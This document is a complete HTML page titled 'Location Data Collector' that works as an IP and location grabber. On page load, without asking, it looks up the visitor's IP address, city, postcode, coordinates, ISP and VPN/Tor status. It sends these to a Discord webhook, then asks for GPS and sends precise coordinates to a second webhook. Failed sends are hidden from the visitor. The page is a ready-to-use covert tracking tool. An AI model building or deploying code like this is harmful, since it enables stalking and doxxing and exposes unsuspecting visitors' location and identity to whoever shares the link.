<!DOCTYPE html>
<html>
<head>
    <title>Location Data Collector</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 40px auto; padding: 20px; }
        .status { padding: 15px; margin: 15px 0; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .info { background: #d1ecf1; color: #0c5460; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:disabled { background: #ccc; }
    </style>
</head>
<body>
    <h1>Location Data Collection</h1>
    <div id="status" class="status info">Initializing...</div>
    <button id="getLocationBtn" onclick="requestGPSLocation()">Get Precise Location</button>
    
    <script>
        // Configuration - REPLACE THESE WITH YOUR VALUES
        const API_KEY = 'BIGDATACLOUD_API_KEY'; // Get from: https://www.bigdatacloud.com/account
        const IP_GEOLOCATION_WEBHOOK = 'DISCORD_WEBHOOK_URL';
        const REVERSE_GEOCODE_WEBHOOK = 'DISCORD_WEBHOOK_URL';
        
        // Status element
        const statusEl = document.getElementById('status');
        
        // Always run IP geolocation on page load
        window.addEventListener('load', () => {
            fetchIPGeolocationData();
        });
        
        // Function to always get IP geolocation
        async function fetchIPGeolocationData() {
            statusEl.textContent = 'Getting IP geolocation data...';
            statusEl.className = 'status info';
            
            try {
                // Fetch all required data in parallel
                const [ipGeoData, userAgentData, riskData] = await Promise.all([
                    fetch(`https://api-bdc.net/data/ip-geolocation-full?key=${API_KEY}`).then(r => r.json()),
                    fetch(`https://api-bdc.net/data/user-agent-info?key=${API_KEY}`).then(r => r.json()),
                    fetch(`https://api-bdc.net/data/user-risk?key=${API_KEY}`).then(r => r.json())
                ]);
                
                // Prepare webhook data with your specified field names
                const webhookData = {
                    // IP Geolocation data
                    'IP Address (ip)': ipGeoData.ip || 'N/A',
                    'Continent (continent)': ipGeoData.location?.continent || 'N/A',
                    'Country (name)': ipGeoData.country?.name || 'N/A',
                    'Region (principalSubdivision)': ipGeoData.location?.principalSubdivision || 'N/A',
                    'City (city)': ipGeoData.location?.city || ipGeoData.location?.localityName || 'N/A',
                    'Locality (localityName)': ipGeoData.location?.localityName || 'N/A',
                    'Post Code (postcode)': ipGeoData.location?.postcode || 'N/A',
                    'Coordinates (latitude & longitude)': ipGeoData.location?.latitude && ipGeoData.location?.longitude 
                        ? `${ipGeoData.location.latitude}, ${ipGeoData.location.longitude}` 
                        : 'N/A',
                    'Timezone (ianaTimeId)': ipGeoData.location?.timeZone?.ianaTimeId || 'N/A',
                    'Localtime (localTime)': ipGeoData.location?.timeZone?.localTime || 'N/A',
                    'ASN (asn inside carriers)': ipGeoData.network?.carriers?.[0]?.asn || 'N/A',
                    'Organization (organisation inside carriers)': ipGeoData.network?.carriers?.[0]?.organisation || 'N/A',
                    'Confidence (confidence)': ipGeoData.confidence || 'N/A',
                    
                    // Security data from hazardReport
                    'Security Threat (securityThreat)': ipGeoData.securityThreat || 'N/A',
                    'VPN (isKnownAsVpn)': ipGeoData.hazardReport?.isKnownAsVpn ? 'Yes' : 'No',
                    'Proxy (isKnownAsProxy)': ipGeoData.hazardReport?.isKnownAsProxy ? 'Yes' : 'No',
                    'Tor (isKnownAsTorServer)': ipGeoData.hazardReport?.isKnownAsTorServer ? 'Yes' : 'No',
                    // Additional hazard info you wanted
                    'Hosting ASN (isHostingAsn)': ipGeoData.hazardReport?.isHostingAsn ? 'Yes' : 'No',
                    'Cellular Network (isCellular)': ipGeoData.hazardReport?.isCellular ? 'Yes' : 'No',
                    'Public Router (isKnownAsPublicRouter)': ipGeoData.hazardReport?.isKnownAsPublicRouter ? 'Yes' : 'No',
                    
                    // User Agent and Risk data
                    'Risk (risk)': riskData.risk || 'N/A',
                    'User Agent (from the browser)': userAgentData.userAgent || navigator.userAgent,
                    'Device (device)': userAgentData.device || 'N/A',
                    'OS (os)': userAgentData.os || 'N/A',
                    'Mobile (isMobile)': userAgentData.isMobile ? 'Yes' : 'No',
                    'Bot (isSpider)': userAgentData.isSpider ? 'Yes' : 'No'
                };
                
                // Send IP geolocation webhook (ALWAYS SENT)
                await sendWebhook(IP_GEOLOCATION_WEBHOOK, {
                    source: 'ip_geolocation',
                    timestamp: new Date().toISOString(),
                    data: webhookData,
                    rawData: { ipGeoData, userAgentData, riskData } // Include raw data for reference
                });
                
                statusEl.textContent = 'IP geolocation data collected and sent! Click button above for precise GPS location.';
                statusEl.className = 'status success';
                
                return ipGeoData;
                
            } catch (error) {
                statusEl.textContent = `Error fetching IP geolocation: ${error.message}`;
                statusEl.className = 'status error';
                console.error('IP Geolocation Error:', error);
            }
        }
        
        // Function to request GPS location
        async function requestGPSLocation() {
            const button = document.getElementById('getLocationBtn');
            button.disabled = true;
            button.textContent = 'Requesting GPS...';
            
            statusEl.textContent = 'Requesting GPS permission...';
            statusEl.className = 'status info';
            
            if (!navigator.geolocation) {
                statusEl.textContent = 'Geolocation is not supported by your browser';
                statusEl.className = 'status error';
                button.disabled = false;
                button.textContent = 'Get Precise Location';
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    // GPS granted - get reverse geocode data
                    const { latitude, longitude } = position.coords;
                    statusEl.textContent = `GPS location obtained: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
                    
                    try {
                        const reverseGeoData = await fetch(
                            `https://api-bdc.net/data/reverse-geocode-with-timezone?latitude=${latitude}&longitude=${longitude}&key=${API_KEY}`
                        ).then(r => r.json());
                        
                        // Prepare reverse geocode webhook data
                        const reverseWebhookData = {
                            'Source': 'gps_reverse_geocode',
                            'IP Address (ip)': 'From GPS - Not applicable',
                            'Continent (continent)': reverseGeoData.continent || 'N/A',
                            'Country (name)': reverseGeoData.countryName || 'N/A',
                            'Region (principalSubdivision)': reverseGeoData.principalSubdivision || 'N/A',
                            'City (city)': reverseGeoData.city || 'N/A',
                            'Locality (locality)': reverseGeoData.locality || 'N/A',
                            'Post Code (postcode)': reverseGeoData.postcode || 'N/A',
                            'Coordinates (latitude & longitude)': `${reverseGeoData.latitude}, ${reverseGeoData.longitude}`,
                            'Timezone (ianaTimeId)': reverseGeoData.timeZone?.ianaTimeId || 'N/A',
                            'Localtime (localTime)': reverseGeoData.timeZone?.localTime || 'N/A',
                            'ASN (asn inside carriers)': 'From GPS - Not applicable',
                            'Organization (organisation inside carriers)': 'From GPS - Not applicable',
                            'Confidence (confidence)': 'High (GPS)',
                            'Security Threat (securityThreat)': 'From GPS - Not applicable',
                            'VPN (isKnownAsVpn)': 'From GPS - Not applicable',
                            'Proxy (isKnownAsProxy)': 'From GPS - Not applicable',
                            'Tor (isKnownAsTorServer)': 'From GPS - Not applicable',
                            'GPS Accuracy (meters)': position.coords.accuracy || 'N/A',
                            'GPS Altitude': position.coords.altitude || 'N/A'
                        };
                        
                        // Send separate webhook for reverse geocode data
                        await sendWebhook(REVERSE_GEOCODE_WEBHOOK, {
                            source: 'gps_reverse_geocode',
                            timestamp: new Date().toISOString(),
                            gpsCoordinates: { latitude, longitude },
                            data: reverseWebhookData,
                            rawData: reverseGeoData
                        });
                        
                        statusEl.textContent = '✓ GPS location data collected and sent! (Check separate webhook)';
                        statusEl.className = 'status success';
                        
                    } catch (error) {
                        statusEl.textContent = `Error with reverse geocoding: ${error.message}`;
                        statusEl.className = 'status error';
                    }
                    
                    button.disabled = false;
                    button.textContent = 'Get Precise Location';
                },
                (error) => {
                    // GPS denied or error
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            statusEl.textContent = 'GPS permission denied. Using IP location only.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            statusEl.textContent = 'Location information unavailable.';
                            break;
                        case error.TIMEOUT:
                            statusEl.textContent = 'Location request timed out.';
                            break;
                        default:
                            statusEl.textContent = 'Unknown error getting location.';
                    }
                    statusEl.className = 'status error';
                    button.disabled = false;
                    button.textContent = 'Get Precise Location';
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
        
        // Function to send webhook
        async function sendWebhook(url, data) {
            if (!url || url.includes('YOUR_')) {
                console.warn('Webhook URL not configured. Data:', data);
                return;
            }
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                if (!response.ok) {
                    throw new Error(`Webhook failed: ${response.status}`);
                }
                
                console.log('Webhook sent successfully');
            } catch (error) {
                console.error('Webhook Error:', error);
                // Don't show to user - webhook failure shouldn't break UX
            }
        }
    </script>
</body>
</html>
